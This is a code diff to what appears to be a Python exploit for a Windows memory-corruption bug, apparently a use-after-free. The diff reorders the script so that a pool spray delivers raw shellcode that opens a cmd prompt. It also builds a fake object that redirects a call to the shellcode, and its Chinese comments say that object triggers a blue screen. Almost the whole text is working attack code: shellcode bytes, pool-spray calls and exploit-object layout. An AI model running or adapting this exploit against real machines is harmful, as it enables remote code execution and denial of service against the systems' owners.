@@ -136,25 +136,6 @@ def main():
 
     shellcode += buf
 
-    print('shellcode len: %d' % len(shellcode))
-
-    payload_size = 1600
-    payload = b'\x2c\xf0\x4f\x87' + shellcode
-    payload = payload + b'\x5a' * (payload_size - len(payload))
-
-    # payload 攻击汇编语句 用于建立连接
-    # crypter 建立连接后返回的结构体
-    # fake_obj 攻击汇编语句 用于蓝屏
-    print('[+] spraying pool')
-    pool_spray(s, crypter, payload)
-
-    ###################################################
-
-    fake_obj_size = 168
-    call_offset = 108
-    fake_obj = b'\x00'*call_offset + shellcode_address
-    fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))
-
     ##################打开cmd#######################
     outCode = b""
     outCode += b"\xEB\x60\x55\x8B\xEC\x64\xA1\x30"
@@ -180,6 +161,26 @@ def main():
     outCode += b"\xC4\x08\x68\x63\x6D\x64\x00\x54"
     outCode += b"\xFF\xD0"
     #############################################
+
+    print('shellcode len: %d' % len(shellcode))
+
+    payload_size = 1600
+    payload = b'\x2c\xf0\x4f\x87' + shellcode
+    payload = payload + b'\x5a' * (payload_size - len(payload))
+
+    # payload 攻击汇编语句 用于建立连接
+    # crypter 建立连接后返回的结构体
+    # fake_obj 攻击汇编语句 用于蓝屏
+    print('[+] spraying pool')
+    # pool_spray(s, crypter, payload)
+    pool_spray(s, crypter, outCode)
+
+    ###################################################
+
+    fake_obj_size = 168
+    call_offset = 108
+    fake_obj = b'\x00'*call_offset + shellcode_address
+    fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))
 
     time.sleep(.5)
     print('[+] sending free')
